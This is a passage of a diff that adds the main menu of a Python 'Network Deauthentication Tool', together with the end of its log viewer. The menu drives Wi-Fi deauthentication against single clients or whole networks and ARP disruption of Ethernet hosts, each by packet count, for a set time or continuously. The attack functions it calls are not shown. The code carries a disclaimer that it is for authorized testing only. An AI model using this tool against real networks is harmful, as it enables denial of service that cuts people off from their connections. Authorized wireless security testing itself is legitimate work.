+                print(f"{headers[0]:<20} {headers[1]:<15} {headers[2]:<10} {headers[3]:<12} "
+                      f"{headers[4]:<18} {headers[5]:<20} {headers[8]:<10} {headers[10]:<30}")
+                print("-"*120)
+                
+                for row in rows[1:]:
+                    if len(row) >= 11:
+                        print(f"{row[0]:<20} {row[1]:<15} {row[2]:<10} {row[3]:<12} "
+                              f"{row[4]:<18} {row[5][:20]:<20} {row[8]:<10} {row[10][:30]:<30}")
+        
+        print("="*120)
+        print(f"\nTotal entries: {len(rows)-1}")
+    else:
+        print("Log file not found!")
+
+def main():
+    global selected_network, selected_client, scan_results, clients_list, running
+    global selected_interfaces
+    
+    check_root()
+    
+    print("="*70)
+    print("NETWORK DEAUTHENTICATION TOOL")
+    print("Wi-Fi + Ethernet Support")
+    print("For educational and authorized testing only!")
+    print("="*70)
+    
+    # Show available interfaces
+    interfaces = get_available_interfaces()
+    print("\nDetected Interfaces:")
+    for iface_type, iface_list in interfaces.items():
+        print(f"  {iface_type.upper()}: {', '.join(iface_list) if iface_list else 'None'}")
+    print("="*70)
+    
+    try:
+        while True:
+            print("\n" + "="*70)
+            print("MAIN MENU")
+            print("="*70)
+            print("1. Scan for Wi-Fi networks")
+            print("2. Scan for Ethernet devices")
+            print("3. Select a Wi-Fi network")
+            print("4. Deauthenticate a client")
+            print("5. Deauthenticate all clients")
+            print("6. Configure Interfaces")
+            print("7. Check Adapter Status")
+            print("8. View Logs")
+            print("9. Stop All Attacks")
+            print("10. Restore Wi-Fi Connection")
+            print("11. Exit")
+            print("="*70)
+            
+            choice = input("Select an option (1-11): ").strip()
+            
+            if choice == '1':
+                # Scan Wi-Fi
+                if not selected_interfaces["wlan"]:
+                    print("\nWi-Fi interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                print(f"\nUsing interface: {selected_interfaces['wlan']}")
+                
+                # Check monitor mode
+                if not check_monitor_mode(selected_interfaces["wlan"]):
+                    print("Interface is not in monitor mode!")
+                    set_monitor = input("Set to monitor mode now? (y/n): ").lower()
+                    if set_monitor == 'y':
+                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
+                        if success:
+                            selected_interfaces["wlan"] = new_iface
+                        else:
+                            print("Failed to set monitor mode!")
+                            continue
+                    else:
+                        continue
+                
+                # Scan networks
+                scan_results = enhanced_wifi_scan(selected_interfaces["wlan"])
+                
+                if scan_results:
+                    display_networks(scan_results, "Wi-Fi")
+                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
+                              status=f"Found {len(scan_results)} networks")
+                else:
+                    print("\nNo networks found!")
+                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
+                              status="No networks found")
+            
+            elif choice == '2':
+                # Scan Ethernet
+                if not selected_interfaces["eth"]:
+                    print("\nEthernet interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                scan_results = scan_arp_network(selected_interfaces["eth"])
+                
+                if scan_results:
+                    display_networks(scan_results, "Ethernet")
+                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
+                              status=f"Found {len(scan_results)} devices")
+                else:
+                    print("\nNo devices found!")
+                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
+                              status="No devices found")
+            
+            elif choice == '3':
+                # Select Wi-Fi network - FIXED VERSION
+                if not selected_interfaces["wlan"]:
+                    print("\nWi-Fi interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                # Check if interface is in monitor mode
+                if not check_monitor_mode(selected_interfaces["wlan"]):
+                    print(f"\n{selected_interfaces['wlan']} is not in monitor mode!")
+                    print("Client scanning requires monitor mode.")
+                    set_monitor = input("Set to monitor mode now? (y/n): ").lower()
+                    if set_monitor == 'y':
+                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
+                        if success:
+                            selected_interfaces["wlan"] = new_iface
+                            print(f"Interface set to: {selected_interfaces['wlan']}")
+                        else:
+                            print("Failed to set monitor mode!")
+                            continue
+                    else:
+                        continue
+                
+                if not scan_results or not any('BSSID' in net for net in scan_results):
+                    print("\nPlease scan for Wi-Fi networks first (Option 1)!")
+                    continue
+                
+                wifi_nets = [net for net in scan_results if 'BSSID' in net]
+                if not wifi_nets:
+                    print("\nNo Wi-Fi networks in scan results!")
+                    continue
+                
+                display_networks(wifi_nets, "Wi-Fi")
+                
+                try:
+                    net_choice = int(input(f"\nSelect network (1-{len(wifi_nets)}): "))
+                    if 1 <= net_choice <= len(wifi_nets):
+                        selected_network = wifi_nets[net_choice-1]
+                        print(f"\nSelected Network:")
+                        print(f"  BSSID: {selected_network['BSSID']}")
+                        print(f"  Channel: {selected_network['Channel']}")
+                        print(f"  ESSID: {selected_network['ESSID']}")
+                        
+                        # Scan for clients
+                        clients_list = select_network(
+                            selected_interfaces["wlan"],
+                            selected_network['BSSID'],
+                            selected_network['Channel']
+                        )
+                        
+                        if clients_list:
+                            display_clients(clients_list)
+                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
+                                     selected_network['BSSID'], selected_network['ESSID'],
+                                     status=f"Found {len(clients_list)} clients")
+                        else:
+                            print("\nNo clients found!")
+                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
+                                     selected_network['BSSID'], selected_network['ESSID'],
+                                     status="No clients found")
+                    else:
+                        print("Invalid selection!")
+                except ValueError:
+                    print("Please enter a valid number!")
+            
+            elif choice == '4':
+                # Deauth client
+                print("\nSelect attack type:")
+                print("1. Wi-Fi deauthentication")
+                print("2. Ethernet ARP disruption")
+                
+                attack_type = input("Select (1-2): ").strip()
+                
+                if attack_type == '1':
+                    if not selected_network:
+                        print("\nPlease select a Wi-Fi network first (Option 3)!")
+                        continue
+                    
+                    if not clients_list:
+                        print("\nNo clients available!")
+                        continue
+                    
+                    display_clients(clients_list)
+                    
+                    try:
+                        client_choice = int(input(f"\nSelect client (1-{len(clients_list)}): "))
+                        if 1 <= client_choice <= len(clients_list):
+                            selected_client = clients_list[client_choice-1]
+                            
+                            print(f"\nSelected Client: {selected_client['MAC']}")
+                            print(f"Network: {selected_network['ESSID']}")
+                            
+                            print("\nAttack Options:")
+                            print("1. Send specific number of packets")
+                            print("2. Send for duration (seconds)")
+                            print("3. Continuous")
+                            
+                            option = input("Select (1-3): ").strip()
+                            
+                            if option == '1':
+                                count = int(input("Number of packets: "))
+                                print(f"\nStarting deauth...")
+                                deauth_client(selected_interfaces["wlan"], "wlan",
+                                            selected_network['BSSID'], selected_client['MAC'],
+                                            count=count)
+                                
+                            elif option == '2':
+                                duration = int(input("Duration (seconds): "))
+                                print(f"\nStarting deauth for {duration} seconds...")
+                                deauth_client(selected_interfaces["wlan"], "wlan",
+                                            selected_network['BSSID'], selected_client['MAC'],
+                                            duration=duration)
+                                
+                            elif option == '3':
+                                print(f"\nStarting continuous deauth...")
+                                deauth_client(selected_interfaces["wlan"], "wlan",
+                                            selected_network['BSSID'], selected_client['MAC'])
+                                
+                            else:
+                                print("Invalid option!")
+                        else:
+                            print("Invalid selection!")
+                    except ValueError:
+                        print("Please enter a valid number!")
+                
+                elif attack_type == '2':
+                    if not selected_interfaces["eth"]:
+                        print("\nEthernet interface not configured!")
+                        continue
+                    
+                    target_mac = input("\nEnter target MAC address: ").strip()
+                    if not target_mac:
+                        print("No MAC address provided!")
+                        continue
+                    
+                    print("\nAttack Options:")
+                    print("1. Send specific number of packets")
+                    print("2. Send for duration (seconds)")
+                    print("3. Continuous")
+                    
+                    option = input("Select (1-3): ").strip()
+                    
+                    if option == '1':
+                        count = int(input("Number of packets: "))
+                        print(f"\nStarting ARP disruption...")
+                        deauth_client(selected_interfaces["eth"], "eth", "", 
+                                     target_mac, count=count)
+                        
+                    elif option == '2':
+                        duration = int(input("Duration (seconds): "))
+                        print(f"\nStarting ARP disruption for {duration} seconds...")
+                        deauth_client(selected_interfaces["eth"], "eth", "", 
+                                     target_mac, duration=duration)
+                        
+                    elif option == '3':
+                        print(f"\nStarting continuous ARP disruption...")
+                        deauth_client(selected_interfaces["eth"], "eth", "", 
+                                     target_mac)
+                        
+                    else:
+                        print("Invalid option!")
+                
+                else:
+                    print("Invalid selection!")
+            
+            elif choice == '5':
+                # Deauth all
+                print("\nSelect attack type:")
+                print("1. Wi-Fi broadcast deauth")
+                print("2. Ethernet broadcast disruption")
+                
+                attack_type = input("Select (1-2): ").strip()
+                
+                if attack_type == '1':
+                    if not selected_network:
+                        print("\nPlease select a Wi-Fi network first (Option 3)!")
+                        continue
+                    
+                    print(f"\nNetwork: {selected_network['ESSID']}")
+                    print(f"Channel: {selected_network['Channel']}")
+                    
+                    print("\nAttack Options:")
+                    print("1. Send specific number of packets")
+                    print("2. Send for duration (seconds)")
+                    print("3. Continuous")
+                    
+                    option = input("Select (1-3): ").strip()
+                    
+                    if option == '1':
+                        count = int(input("Number of packets: "))
+                        print(f"\nStarting broadcast deauth...")
+                        deauth_all(selected_interfaces["wlan"], "wlan",
+                                  selected_network['BSSID'], selected_network['Channel'],
+                                  count=count)
+                        
+                    elif option == '2':
+                        duration = int(input("Duration (seconds): "))
+                        print(f"\nStarting broadcast deauth for {duration} seconds...")
+                        deauth_all(selected_interfaces["wlan"], "wlan",
+                                  selected_network['BSSID'], selected_network['Channel'],
+                                  duration=duration)
+                        
+                    elif option == '3':
+                        print(f"\nStarting continuous broadcast deauth...")
+                        deauth_all(selected_interfaces["wlan"], "wlan",
+                                  selected_network['BSSID'], selected_network['Channel'])
+                        
+                    else:
+                        print("Invalid option!")
+                
+                elif attack_type == '2':
+                    if not selected_interfaces["eth"]:
+                        print("\nEthernet interface not configured!")
+                        continue
+                    
+                    print("\nAttack Options:")
+                    print("1. Send specific number of packets")
+                    print("2. Send for duration (seconds)")
+                    print("3. Continuous")
+                    
+                    option = input("Select (1-3): ").strip()
+                    
+                    if option == '1':
+                        count = int(input("Number of packets: "))
+                        print(f"\nStarting broadcast disruption...")
+                        deauth_all(selected_interfaces["eth"], "eth", count=count)
+                        
+                    elif option == '2':
+                        duration = int(input("Duration (seconds): "))
+                        print(f"\nStarting broadcast disruption for {duration} seconds...")
+                        deauth_all(selected_interfaces["eth"], "eth", duration=duration)
+                        
+                    elif option == '3':
+                        print(f"\nStarting continuous broadcast disruption...")
+                        deauth_all(selected_interfaces["eth"], "eth")
+                        
+                    else:
+                        print("Invalid option!")
+                
+                else:
+                    print("Invalid selection!")
+            
+            elif choice == '6':
+                # Configure interfaces
+                print("\nConfigure Interfaces:")
+                print("1. Configure Wi-Fi interface")
+                print("2. Configure Ethernet interface")
+                print("3. Configure both")
+                
+                config_choice = input("Select (1-3): ").strip()
+                
+                if config_choice == '1':
+                    iface = configure_wifi_interface()
+                    if iface:
+                        selected_interfaces["wlan"] = iface
+                        print(f"\nWi-Fi interface set to: {iface}")
+                
+                elif config_choice == '2':
+                    iface = configure_eth_interface()
+                    if iface:
+                        selected_interfaces["eth"] = iface
+                        print(f"\nEthernet interface set to: {iface}")
+                
+                elif config_choice == '3':
+                    wifi_iface = configure_wifi_interface()
+                    if wifi_iface:
+                        selected_interfaces["wlan"] = wifi_iface
+                    
+                    eth_iface = configure_eth_interface()
+                    if eth_iface:
+                        selected_interfaces["eth"] = eth_iface
+                    
+                    print(f"\nInterfaces configured:")
+                    print(f"  Wi-Fi: {selected_interfaces.get('wlan', 'Not set')}")
+                    print(f"  Ethernet: {selected_interfaces.get('eth', 'Not set')}")
+                
+                else:
+                    print("Invalid choice!")
+            
+            elif choice == '7':
+                check_adapter_status()
+            
+            elif choice == '8':
+                view_logs()
+            
+            elif choice == '9':
+                stop_all_attacks()
+            
+            elif choice == '10':
+                # Restore Wi-Fi
+                if selected_interfaces["wlan"]:
+                    success = restore_managed_mode(selected_interfaces["wlan"])
+                    if success:
+                        print("\nWi-Fi restored to managed mode.")
+                        print("You may need to reconnect to your network.")
+                    else:
+                        print("\nFailed to restore Wi-Fi.")
+                else:
+                    print("\nNo Wi-Fi interface configured!")
+            
+            elif choice == '11':
+                # Exit - FIXED VERSION
+                print("\nCleaning up and exiting...")
+                
+                # Stop all attacks
+                stop_all_attacks()
+                
+                # Restore all interfaces
+                restore_all_interfaces()
+                
+                print("\nThank you for using Network Deauthentication Tool!")
+                print("Remember: Use only for authorized testing!")
+                print("Exiting...")
+                break
+            
+            else:
+                print("\nInvalid option! Please select 1-11.")
+                
+    except KeyboardInterrupt:
+        print("\n\nInterrupted by user.")
+        stop_all_attacks()
+        restore_all_interfaces()
+        print("Exiting...")
+    except Exception as e:
+        print(f"\nUnexpected error: {e}")
+        logger.log("System_Error", "System", "", status=f"Unexpected error: {e}")
+
+if __name__ == "__main__":
+    main()
